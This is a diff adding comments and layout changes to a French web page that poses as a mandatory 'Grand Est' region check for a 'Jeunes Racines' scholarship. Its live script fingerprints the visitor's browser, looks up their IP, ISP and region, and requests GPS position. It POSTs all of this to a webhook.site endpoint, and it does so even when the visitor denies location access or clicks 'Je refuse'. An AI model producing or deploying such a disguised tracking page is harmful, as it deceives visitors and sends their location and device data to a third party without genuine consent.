@@ -5,13 +5,16 @@
   <title>Jeunes Racines – Confirmation de région</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    /* ===== Page Layout ===== */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background-color: #f7f7f7;
     }
+
+    /* ===== Top Banner Section ===== */
     .banner {
-      background-image: url('https://i.imgur.com/ONf3SmL.png');
+      background-image: url('https://i.imgur.com/ONf3SmL.png'); /* Background image for header */
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
@@ -24,14 +27,19 @@
       font-weight: bold;
       text-shadow: 1px 1px 3px #000;
     }
+
+    /* Lock icon styling inside the banner */
     .lock-icon {
-      margin-right: 10px;
       font-size: 24px;
+      line-height: 1; /* Vertically aligns it better with the text */
     }
+
+    /* ===== Main Content Styling ===== */
     .content {
       padding: 30px;
       text-align: center;
     }
+
     .logo {
       width: 250px;
       margin-bottom: 20px;
@@ -39,6 +47,8 @@
       margin-left: auto;
       margin-right: auto;
     }
+
+    /* Main green button */
     button {
       padding: 12px 24px;
       font-size: 16px;
@@ -48,21 +58,30 @@
       border-radius: 6px;
       cursor: pointer;
     }
+
+    /* Red "Je refuse" button styling */
     .refuse-button {
       background-color: darkred;
       margin-top: 15px;
+      margin-bottom: 25px; /* Adds breathing room below the red button */
     }
+
+    /* Paragraph text style */
     p {
       font-size: 16px;
       max-width: 600px;
       margin: 20px auto;
     }
+
+    /* Loading text style (appears during location lookup) */
     .loading {
       display: none;
       margin-top: 15px;
       font-size: 14px;
       color: #333;
     }
+
+    /* Region/IP display text */
     .region {
       font-size: 14px;
       color: #333;
@@ -72,34 +91,52 @@
 </head>
 <body>
 
-  <!-- 🔒 Lock + Banner -->
+  <!-- 🔒 Banner with lock and title using flex layout -->
   <div class="banner">
-    <span class="lock-icon">🔒</span>Jeunes Racines
+    <div style="display: flex; align-items: center; gap: 10px;">
+      <span class="lock-icon">🔒</span>
+      <span>Jeunes Racines</span>
+    </div>
   </div>
 
   <div class="content">
+    <!-- 🌱 Logo image -->
     <img src="https://i.imgur.com/GpAGxP1.png" alt="Jeunes Racines Logo" class="logo">
+
+    <!-- 📍 Heading and instructions -->
     <h2>Vérification de la Région Grand Est</h2>
-    <p>Avant de poursuivre votre candidature pour la Bourse Jeunes Racines, veuillez confirmer que vous êtes dans la région Grand Est. Cette vérification est obligatoire.</p>
+    <p>
+      Avant de poursuivre votre candidature pour la Bourse Jeunes Racines,
+      veuillez confirmer que vous êtes dans la région Grand Est.
+      Cette vérification est obligatoire.
+    </p>
+
+    <!-- 🌍 Shows region/IP info pulled from IP lookup -->
     <div id="ip-region" class="region">📍 Détection de votre région en cours...</div>
 
-    <!-- ✅ Confirm button -->
+    <!-- ✅ GPS location confirm button -->
     <button onclick="getLocation()">Je confirme ma position</button>
 
-    <!-- ❌ Manual refusal button -->
+    <!-- ❌ Refuse button fallback -->
     <br><br>
     <button class="refuse-button" onclick="refuse()">Je refuse</button>
 
+    <!-- ⏳ Loading text appears during location detection -->
     <div class="loading" id="loading-text">⏳ Vérification en cours... Merci de patienter.</div>
-    <p style="font-size: 13px; color: grey;">Cette étape prend environ 15 secondes et améliore la sécurité du formulaire.</p>
+
+    <!-- ℹ️ Small footer text -->
+    <p style="font-size: 13px; color: grey;">
+      Cette étape prend environ 15 secondes et améliore la sécurité du formulaire.
+    </p>
   </div>
 
-  <!-- ✅ Fingerprint + IP + GPS + Region + Redirect -->
+  <!-- 🧠 FINGERPRINT + REGION + LOCATION SCRIPT -->
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
-    let fingerprintData = {};
-    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/"; // Redirect destination
+    let fingerprintData = {}; // Used to store browser/device info
+    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/"; // Redirect after success
 
+    // 🔍 Load FingerprintJS and collect device/browser info
     FingerprintJS.load().then(fp => {
       fp.get().then(result => {
         fingerprintData = {
@@ -115,7 +152,7 @@
           cpuCores: navigator.hardwareConcurrency || "unknown"
         };
 
-        // 📍 Fetch IP + region info
+        // 🌍 Fetch IP + ISP + Region info
         fetch('https://ipwho.is/')
           .then(response => response.json())
           .then(ipInfo => {
@@ -129,17 +166,19 @@
               timezone: ipInfo.timezone?.id
             };
 
+            // Display to user
             document.getElementById('ip-region').textContent = `📍 Région détectée : ${ipInfo.region}, ${ipInfo.country}`;
           });
       });
     });
 
-    // ✅ GPS flow
+    // ✅ If user clicks “Je confirme ma position”
     function getLocation() {
       document.getElementById("loading-text").style.display = "block";
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
+          // Log successful GPS data
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -150,10 +189,14 @@
               fingerprint: fingerprintData
             })
           });
+
+          // Redirect after short pause
           setTimeout(() => {
             window.location.href = finalRedirectURL;
           }, 1000);
+
         }, function(error) {
+          // User denied location access
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -162,15 +205,17 @@
               fingerprint: fingerprintData
             })
           });
+
           alert("Accès refusé. Redirection...");
           window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
         });
+
       } else {
         alert("Géolocalisation non supportée.");
       }
     }
 
-    // ❌ Manual refusal button
+    // ❌ Manual “Je refuse” fallback option
     function refuse() {
       fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
         method: "POST",
